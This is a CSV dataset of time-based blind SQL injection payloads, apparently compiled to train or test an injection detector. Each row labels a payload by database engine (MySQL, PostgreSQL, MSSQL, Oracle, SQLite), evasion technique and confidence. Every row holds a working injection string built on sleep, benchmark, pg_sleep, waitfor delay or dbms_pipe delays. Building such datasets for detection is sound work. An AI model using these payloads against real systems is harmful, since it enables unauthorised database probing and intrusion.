payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 9069 = 9069,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" and ( select * from ( select ( sleep ( 5 ) ) ) fzno )",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%' or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' ) where 3450 = 3450 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1' ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'cbaj' = 'cbaj,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1'+ ( select 'hjku' where 1954 = 1954 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) +',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 9505 = 9505,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1%' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'ksoc' = 'ksoc,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) as hgtl where 3864 = 3864 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""fbol"" like ""fbol",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) where 6954 = 6954 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( 'hqcz' = 'hqcz,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'gjja' = 'gjja,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'wyvx' = 'wyvx,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) as jask where 7629 = 7629 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ""oivc"" like ""oivc",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1 ) as eryo where 2531 = 2531 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" and sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""ppml"" = ""ppml",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' in boolean mode ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1'|| ( select 'xglm' from dual where 3556 = 3556 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1"" ) ) and sleep ( 5 ) and ( ( ""timv"" = ""timv",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and ( ( ( 'hrta' = 'hrta,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""hdis"" like ""hdis",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) where 2020 = 2020 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' in boolean mode ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) #",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ""iuxs"" like ""iuxs",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( 'jfwt' like 'jfwt",time_blind,mysql,function_alternative|hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' where 5455 = 5455 and sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ""jvys"" like ""jvys",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1 ) ) as skex where 7941 = 7941 and sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1 ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 8024 = 8024",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"select pg_sleep ( 5 ) and ( ( ( ""wqeb"" = ""wqeb",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo )",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) waitfor delay '0:0:5',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
"1%"" ) ) and sleep ( 5 ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'cogf' like 'cogf",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"1"" ) ) as jgie where 8017 = 8017 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' waitfor delay '0:0:5' and 'dtej' like 'dtej,time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ( ( ""rthl"" like ""rthl",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1' ) ) as owcw where 1107 = 1107 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
1'|| ( select 'xwbo' from dual where 1263 = 1263 waitfor delay '0:0:5' ) ||',time_blind,mssql,case_variation,0.41,rule,sqliv2_csv,unknown
1' ) as xrap where 5523 = 5523 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' ) ) as hpta where 5376 = 5376 waitfor delay '0:0:5'--,time_blind,mssql,,0.41,rule,sqliv2_csv,string_single_quote
"1 ) ) as wmxa where 6485 = 6485 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1 ) where 2468 = 2468 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1%"" ) waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" ) as cxwd where 5800 = 5800 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' ) as nftr where 8825 = 8825 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'yfvu' like 'yfvu,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( '%' = '",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1 ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1%' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'gbhd' = 'gbhd",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as nsbu where 6569 = 6569 or sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1'|| ( select 'pyga' from dual where 8501 = 8501 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1' where 9708 = 9708 or sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) as whyr where 9731 = 9731 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1%' ) ) and sleep ( 5 ) and ( ( '%' = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
select sleep ( 5 ) --,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as phis where 4420 = 4420 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1' where 8869 = 8869 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1' ) where 4683 = 4683 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1' or sleep ( 5 ) and 'rpqn' like 'rpqn,time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1%' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( '%' = '",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1%' and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1%' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) waitfor delay '0:0:5' and ( 'fpnh' = 'fpnh,time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1"" and sleep ( 5 )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'ifvz' like 'ifvz,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'udvq' = 'udvq",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1'+ ( select jley where 3581 = 3581 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
1' ) where 2330 = 2330 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" where 4652 = 4652 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1"" ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ""gixv"" = ""gixv",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) where 9821 = 9821 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" where 1683 = 1683 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
waitfor delay '0:0:5' and ( '%' = ',time_blind,mssql,,0.46,rule,sqliv2_csv,unknown
"1 ) where 8856 = 8856 or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1 ) where 9012 = 9012 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
1' ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( 'zaes' = 'zaes,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 and 6969 = ( select 6969 from pg_sleep ( 5 ) ),time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7711 = 7711",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%"" or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'fpaf' = 'fpaf",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1"" ) ) ) and sleep ( 5 ) and ( ( ( ""bvgg"" = ""bvgg",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1' and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1' ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( 'ytxg' = 'ytxg,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%' ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( '%' = '",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'zoin' = 'zoin,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""knbx"" = ""knbx",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) where 9648 = 9648 and elt ( 1210 = 1210,sleep ( 5 ) ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
begin user_lock.sleep ( 5 ),time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
1' ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 waitfor delay '0:0:5'# opyp,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""ejmj"" like ""ejmj",time_blind,sqlite,case_variation|function_alternative,0.53,rule,sqliv2_csv,unknown
"1%"" ) ) ) and sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) as agdn where 8442 = 8442 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( 'lqwz' = 'lqwz",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) where 4038 = 4038 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'fvtf' like 'fvtf",time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1 ) as mixt where 1085 = 1085 or sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1 ) as otsb where 8380 = 8380 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1' or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1%' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( '%' = ',time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1%"" ) and sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) where 5197 = 5197 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" and sleep ( 5 ) and ""masm"" = ""masm",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' in boolean mode ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""felm"" = ""felm",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) # gkkx,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) as jvwq where 6596 = 6596 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1 ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 5874 = 5874",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) as iknl where 3885 = 3885 rlike sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' ) ) as oocd where 2919 = 2919 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1%"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) where 7165 = 7165 and sleep ( 5 ) #,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1%' ) and sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1, ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 where 2649 = 2649 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( 'aiuy' = 'aiuy",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( '%' = '",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ),time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) where 9317 = 9317 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' ) ) as wves where 2641 = 2641 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1%"" ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
